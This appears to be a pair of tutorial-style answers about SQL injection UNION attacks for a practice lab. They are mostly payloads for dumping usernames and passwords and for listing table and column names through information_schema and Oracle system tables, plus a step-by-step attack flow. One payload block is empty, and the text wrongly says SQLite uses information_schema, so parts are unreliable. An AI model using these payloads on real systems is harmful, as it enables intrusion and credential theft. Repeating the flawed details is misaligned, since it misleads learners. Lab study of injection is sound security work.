You've now reached the **final goal** of a UNION attack – actually stealing data.

## The Complete Attack

Once you know:
- **3 columns** exist
- **Column 2** accepts strings

You can steal data:

```sql
' UNION SELECT NULL, username, NULL FROM users --
```

Or steal passwords:

```sql
' UNION SELECT NULL, password, NULL FROM users --
```

Or steal both:

```sql
' UNION SELECT NULL, username || ':' || password, NULL FROM users --
```

## Example with Your Lab

**Original query returns:** 3 columns, column 2 accepts strings

**Attack to steal usernames:**
```
'+UNION+SELECT+NULL,username,NULL+FROM+users--
```

**Attack to steal passwords:**
```

```

## What You Need to Know

| You must know | Example |
|---------------|---------|
| Table name | `users` |
| Column names | `username`, `password` |

## How to Find Table and Column Names

If you don't know them, query the database's system tables:

**PostgreSQL/MySQL:**
```sql
' UNION SELECT NULL, table_name, NULL FROM information_schema.tables --
```

**Oracle:**
```sql
' UNION SELECT NULL, table_name, NULL FROM all_tables --
```

**SQL Server:**
```sql
' UNION SELECT NULL, table_name, NULL FROM information_schema.tables --
```

## The Full Attack Flow

```
1. Find column count     → 3 columns
2. Find string column    → column 2 accepts text
3. Find table names      → SELECT table_name FROM information_schema.tables
4. Find column names     → SELECT column_name FROM information_schema.columns WHERE table_name='users'
5. Steal data            → SELECT username, password FROM users
```

## One Sentence Summary

After finding column count and string columns, replace `'a'` with `username` or `password` from a known table like `users` to steal real data.


---

Here's exactly how attackers retrieve table and column names using `information_schema`.

## Retrieving Table Names

**Payload:**
```sql
' UNION SELECT table_name, NULL FROM information_schema.tables --
```

**Example result:**
| table_name |
|------------|
| users |
| products |
| orders |
| admins |

## Retrieving Column Names for a Specific Table

**Payload (for 'users' table):**
```sql
' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name = 'users' --
```

**Example result:**
| column_name |
|-------------|
| user_id |
| username |
| password |
| email |

## Complete Attack Example

**Step 1 – Find table names:**
```
' UNION SELECT table_name, NULL FROM information_schema.tables --
```
You see: `users`, `products`, `admin_credentials`

**Step 2 – Find columns in 'users':**
```
' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name = 'users' --
```
You see: `username`, `password`, `email`

**Step 3 – Steal the data:**
```
' UNION SELECT username, password FROM users --
```

## Different Databases, Different System Tables

| Database | System table for tables | System table for columns |
|----------|------------------------|--------------------------|
| MySQL, PostgreSQL, SQLite | `information_schema.tables` | `information_schema.columns` |
| Oracle | `all_tables` | `all_tab_columns` |
| SQL Server | `information_schema.tables` | `information_schema.columns` |

## Oracle Example

```sql
-- Get table names
' UNION SELECT table_name, NULL FROM all_tables --

-- Get column names
' UNION SELECT column_name, NULL FROM all_tab_columns WHERE table_name = 'USERS' --
```

## One Sentence Summary

Attackers query `information_schema.tables` to find table names, then `information_schema.columns` to find column names, then steal the data.
